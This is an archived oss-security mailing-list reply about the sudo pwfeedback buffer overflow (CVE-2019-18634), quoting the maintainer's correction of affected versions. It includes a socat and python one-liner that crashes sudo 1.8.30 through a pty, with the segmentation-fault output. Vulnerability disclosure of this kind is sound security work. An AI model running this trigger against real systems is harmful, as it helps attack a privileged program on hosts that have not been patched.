X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1405" "Wednesday" "5" "February" "2020" "22:34:53" "+1100" "William Bowling" "will@wbowling.info" nil "50" nil "^Date:" nil nil "2" nil nil (number mark "        will@wbowlin Feb  5   50/1405  " thread-indent "\"Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 25660 invoked by uid 550); 5 Feb 2020 12:19:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 10026 invoked from network); 5 Feb 2020 11:35:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=wbowling.info; s=google;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
        b=MQyrU6Yf5PZzzfxE/aFl/VPbjV79Vjh2T3r7fRRHKXhufM82gGrh+pwrUojPKeWtP5
         7D+VWWS0cNrrSHMAFk7MchpgtV0WSfsxVXUuFedU/pnC19fZBpoWkaMsQd9f0gCAkURB
         pwskmuWVdDMNIr71/AnejSZnO1AdFYi8o8IcYpCKqq9qZJhbVIj07qx2zZpcf5BJyMFg
         TRoVvIoGfGK+L3C6UvOhQL8k7JjaLsNj4+dXAzvGZjdAWAOBlo2r49t9u8XTjwPoVp3/
         Mu0YIhHUl3Gs1SrVLc1h5Rke1AZVqK2KtfgQ5LGAR81mAYaIyKFTJo2Em6EjbmmKLnrd
         fwXQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
        b=JWuRV391Q6Y4zQrfPI0n4SvGSqyvSvLOB51LoEBoGZVmcw82Q47wnBBmMq+umbTebL
         sE8rtyiw0tgTkiZqa6nKk+ux1eUGa+l3D7AyqrvGXmkgzPQEltwoDyFWCY4TccgEWaB9
         PoXyBq5wd81/6d/c+VtvHhoqLaTeCm40y4onQU0sB+SkrmX3rzbwN+a61HqvpO2DDJGn
         QFUZl+Ot7hqEOUagtA+acgOSupQ4UeFOL8iDET3vR9ObWfcnSUMZi+MzG4rHA5h/s385
         fyXsAyxKkrLINBnZZpPSA1pXkBXIIM6i3Xfbm+IqfOiUJ2cb/wMQ6A2f6tBLYkWssOR6
         ElDA==
X-Gm-Message-State: APjAAAUJOUQ1AiSKrz733LZKUC4y23kUeH5T0yx7bifyIiSXDSHm1fsJ
	1XCB3tvBMiLM3/B7MX9SG6ntI6X4iHtIcFNX+8gBAGCkqMI=
X-Google-Smtp-Source: APXvYqzW6TfCvt4kRE4FQbbrV7tFmzQGsvZIVqN1egK6KhVA9ZB3k48oowybHW6pxx+NR7HEkW36Gq/CJbyHwjmfM7k=
X-Received: by 2002:a5d:6703:: with SMTP id o3mr26831328wru.235.1580902504020;
 Wed, 05 Feb 2020 03:35:04 -0800 (PST)
MIME-Version: 1.0
References: <aff313846ed736fa@sudo.ws>
In-Reply-To: <aff313846ed736fa@sudo.ws>
Message-ID: <CAPWJUny2yaenu_Kg7s4VhuL0nZ4Yg4XPN9HN75e5w0MU4brTnw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="0000000000002d5094059dd28c59"
Date: Wed, 5 Feb 2020 22:34:53 +1100
From: William Bowling <will@wbowling.info>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when
 pwfeedback is enabled
To: oss-security@lists.openwall.com

--0000000000002d5094059dd28c59
Content-Type: text/plain; charset="UTF-8"

When using a pty, sudo_term_eof and sudo_term_kill are initialized to 0x4
and 0x15 allowing the overflow to be reached, making 1.8.26-1.8.30 also
vulnerable:

$ socat pty,link=/tmp/pty,waitslave exec:"python -c
'print((\"A\"*100+chr(0x15))*50)'" &
$ sudo -S id < /tmp/pty
[sudo] password for user1: Segmentation fault
$ sudo -V
Sudo version 1.8.30
Sudoers policy plugin version 1.8.30
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.30

- Will

On Sat, Feb 1, 2020 at 12:59 AM Todd C. Miller <Todd.Miller@sudo.ws> wrote:

> On Thu, 30 Jan 2020 11:23:28 -0700, "Todd C. Miller" wrote:
>
> > Sudo versions affected:
> >
> > Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if
> > the "pwfeedback" option is enabled in sudoers.
>
> It turns out a change in EOF handling introduced in sudo 1.8.26
> prevents exploitation of the bug.  The EOF character is also
> initialized to 0 and sudo 1.8.26 checks for EOF before it checks
> for the kill character.
>
> This means that the bug actually affects sudo versions 1.7.1 to
> 1.8.25p1 inclusive.
>
> Sorry for the oversight.  I've updated the affected versions in
> https://www.sudo.ws/alerts/pwfeedback.html
>
>  - todd
>


-- 

GPG Key ID: 0x980F711A

GPG Key Fingerprint: AA38 2A0E 7D22 18A9 6086  0289 41DC E04B 980F 711A

--0000000000002d5094059dd28c59--
